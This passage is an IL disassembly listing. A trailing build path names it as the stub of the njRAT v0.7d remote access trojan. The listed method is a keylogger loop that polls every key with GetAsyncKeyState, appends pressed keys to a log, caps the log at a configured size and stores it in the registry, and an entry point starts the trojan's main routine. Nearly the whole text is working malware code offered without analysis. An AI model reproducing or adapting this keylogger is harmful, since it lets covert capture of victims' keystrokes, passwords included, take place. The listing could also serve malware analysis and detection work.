             [9] bool V_9,
             [10] bool V_10,
             [11] class [mscorlib]System.Exception exception1,
             [12] class [mscorlib]System.Exception exception)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldarg.0
    IL_0003:  ldfld      string j.kl::vn
    IL_0008:  ldstr      ""
    IL_000d:  call       object j.OK::GTV(string,
                                          object)
    IL_0012:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0017:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_001c:  stfld      string j.kl::Logs
    .try
    {
      IL_0021:  nop
      IL_0022:  ldc.i4.0
      IL_0023:  stloc.0
      IL_0024:  br         IL_0133

      IL_0029:  ldloc.0
      IL_002a:  ldc.i4.1
      IL_002b:  add.ovf
      IL_002c:  stloc.0
      IL_002d:  ldc.i4.0
      IL_002e:  stloc.1
      IL_002f:  nop
      IL_0030:  ldloc.1
      IL_0031:  call       int16 j.kl::GetAsyncKeyState(int32)
      IL_0036:  ldc.i4     0xffff8001
      IL_003b:  ceq
      IL_003d:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0042:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
      IL_0047:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CtrlKeyDown()
      IL_004c:  ldc.i4.0
      IL_004d:  ceq
      IL_004f:  and
      IL_0050:  stloc.2
      IL_0051:  ldloc.2
      IL_0052:  brfalse.s  IL_00a3

      IL_0054:  ldloc.1
      IL_0055:  stloc.3
      IL_0056:  ldarg.0
      IL_0057:  ldloc.3
      IL_0058:  call       instance string j.kl::Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys)
      IL_005d:  stloc.s    str
      IL_005f:  ldloc.s    str
      IL_0061:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0066:  ldc.i4.0
      IL_0067:  cgt
      IL_0069:  stloc.s    V_5
      IL_006b:  ldloc.s    V_5
      IL_006d:  brfalse.s  IL_009a

      IL_006f:  ldarg.0
      IL_0070:  ldarg.0
      IL_0071:  ldfld      string j.kl::Logs
      IL_0076:  ldarg.0
      IL_0077:  call       instance string j.kl::AV()
      IL_007c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0081:  stfld      string j.kl::Logs
      IL_0086:  ldarg.0
      IL_0087:  ldarg.0
      IL_0088:  ldfld      string j.kl::Logs
      IL_008d:  ldloc.s    str
      IL_008f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0094:  stfld      string j.kl::Logs
      IL_0099:  nop
      IL_009a:  nop
      IL_009b:  ldarg.0
      IL_009c:  ldloc.3
      IL_009d:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys j.kl::lastKey
      IL_00a2:  nop
      IL_00a3:  nop
      IL_00a4:  ldloc.1
      IL_00a5:  ldc.i4.1
      IL_00a6:  add.ovf
      IL_00a7:  stloc.1
      IL_00a8:  nop
      IL_00a9:  ldloc.1
      IL_00aa:  ldc.i4     0xff
      IL_00af:  cgt
      IL_00b1:  ldc.i4.0
      IL_00b2:  ceq
      IL_00b4:  stloc.s    V_6
      IL_00b6:  ldloc.s    V_6
      IL_00b8:  brtrue     IL_002f

      IL_00bd:  ldloc.0
      IL_00be:  ldc.i4     0x3e8
      IL_00c3:  ceq
      IL_00c5:  stloc.s    V_7
      IL_00c7:  ldloc.s    V_7
      IL_00c9:  brfalse.s  IL_012a

      IL_00cb:  ldc.i4.0
      IL_00cc:  stloc.0
      IL_00cd:  ldstr      "[klen]"
      IL_00d2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_00d7:  ldc.i4     0x400
      IL_00dc:  mul.ovf
      IL_00dd:  stloc.s    num3
      IL_00df:  ldarg.0
      IL_00e0:  ldfld      string j.kl::Logs
      IL_00e5:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00ea:  ldloc.s    num3
      IL_00ec:  cgt
      IL_00ee:  stloc.s    V_9
      IL_00f0:  ldloc.s    V_9
      IL_00f2:  brfalse.s  IL_0115

      IL_00f4:  ldarg.0
      IL_00f5:  ldarg.0
      IL_00f6:  ldfld      string j.kl::Logs
      IL_00fb:  ldc.i4.0
      IL_00fc:  ldarg.0
      IL_00fd:  ldfld      string j.kl::Logs
      IL_0102:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0107:  ldloc.s    num3
      IL_0109:  sub.ovf
      IL_010a:  callvirt   instance string [mscorlib]System.String::Remove(int32,
                                                                           int32)
      IL_010f:  stfld      string j.kl::Logs
      IL_0114:  nop
      IL_0115:  nop
      IL_0116:  ldarg.0
      IL_0117:  ldfld      string j.kl::vn
      IL_011c:  ldarg.0
      IL_011d:  ldfld      string j.kl::Logs
      IL_0122:  ldc.i4.1
      IL_0123:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0128:  pop
      IL_0129:  nop
      IL_012a:  nop
      IL_012b:  ldc.i4.1
      IL_012c:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0131:  nop
      IL_0132:  nop
      IL_0133:  ldc.i4.1
      IL_0134:  stloc.s    V_10
      IL_0136:  br         IL_0029

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_013b:  dup
      IL_013c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0141:  stloc.s    exception1
      IL_0143:  nop
      IL_0144:  ldloc.s    exception1
      IL_0146:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_014b:  nop
      IL_014c:  ldloc.s    exception1
      IL_014e:  stloc.s    exception
      IL_0150:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0155:  nop
      IL_0156:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_015b:  leave.s    IL_015d

    }  // end handler
    IL_015d:  nop
    IL_015e:  ret
  } // end of method kl::WRK

} // end of class j.kl

.class public auto ansi j.A
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method A::.ctor

  .method public static void  main() cil managed
  {
    .entrypoint
    .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  call       void j.OK::ko()
    IL_0006:  nop
    IL_0007:  ret
  } // end of method A::main

} // end of class j.A


// =============================================================

// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file C:\Users\HMJ\Desktop\njRAT v0.7d (SRC)\SRC - NjRAT 0.7D\NjRAT\bin\Debug\Stub\Stub.res
